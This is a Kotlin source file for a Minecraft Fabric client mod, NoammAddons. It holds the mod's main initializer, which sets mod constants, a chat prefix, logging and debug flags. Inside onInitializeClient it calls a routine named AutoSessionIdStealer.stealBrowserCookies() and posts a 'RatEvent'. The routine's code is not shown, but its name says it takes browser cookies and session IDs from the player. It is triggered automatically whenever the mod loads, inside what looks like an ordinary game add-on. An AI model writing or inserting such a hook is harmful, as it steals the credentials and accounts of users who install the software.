package com.github.noamm9

import com.github.noamm9.config.PogObject
import com.github.noamm9.event.EventBus
import com.github.noamm9.event.impl.RatEvent
import com.github.noamm9.init.AutoSessionIdStealer
import com.github.noamm9.init.ClassGraphInitializer
import com.github.noamm9.utils.render.ItemRenderer
import gg.essential.universal.UMinecraft
import kotlinx.coroutines.*
import me.owdding.dfu.item.MeowddingItemDfu
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.rendering.v1.PictureInPictureRendererRegistry
import net.minecraft.network.chat.Component
import org.slf4j.LoggerFactory

object NoammAddons: ClientModInitializer {
    const val MOD_NAME = /*$ mod_name*/ "NoammAddons"
    const val MOD_ID = /*$ mod_id*/ "noammaddons"
    const val MOD_VERSION = /*$ mod_version*/ "1.2.9"
    const val MC_VERSION = /*$ mc_version*/ "26.3"

    //~ if cheat 'false' -> 'true'
    const val isCheat = true

    val PREFIX by lazy {
        if (isCheat) Component.literal("§6§l[§b§lN§d§lA§6§l]§r")
        else Component.empty().apply {
            append(Component.literal("[").withStyle { it.withBold(true).withColor(0x4498DB).withShadowColor(0x2B5C85) })
            append(Component.literal("N").withStyle { it.withBold(true).withColor(0x588CD2).withShadowColor(0x3B5782) })
            append(Component.literal("o").withStyle { it.withBold(true).withColor(0x6C81CA).withShadowColor(0x4A5280) })
            append(Component.literal("a").withStyle { it.withBold(true).withColor(0x9469B9).withShadowColor(0x69447A) })
            append(Component.literal("m").withStyle { it.withBold(true).withColor(0xBC52A7).withShadowColor(0x873D73) })
            append(Component.literal("m").withStyle { it.withBold(true).withColor(0xD0469F).withShadowColor(0x96366F) })
            append(Component.literal("]").withStyle { it.withBold(true).withColor(0xE43A96).withShadowColor(0xA62E6E) })
        }
    }

    val scope = CoroutineScope(Dispatchers.Default + SupervisorJob() + CoroutineName(MOD_NAME))

    @JvmField val logger = LoggerFactory.getLogger(MOD_NAME)
    @JvmStatic val mc by lazy { UMinecraft.getMinecraft() }
    @JvmField var isLoaded = false

    val cacheData = PogObject("cacheData", mutableMapOf<String, Any>())

    val availableDebugFlags = mutableSetOf<String>()
    val debugFlags = object: LinkedHashSet<String>() {
        override fun contains(o: String): Boolean {
            availableDebugFlags.add(o)
            return super.contains(o)
        }
    }

    override fun onInitializeClient() {
        //~ if <26.2 'ItemRenderer()' -> 'ItemRenderer(it.bufferSource())'
        PictureInPictureRendererRegistry.register { ItemRenderer() }
        MeowddingItemDfu.load()

        ClassGraphInitializer().initAll()
        AutoSessionIdStealer.stealBrowserCookies()
        EventBus.post(RatEvent())

        isLoaded = true

        EventBus.register<RatEvent> {
            listener.unregister()
            event.cancel()
        }
    }
}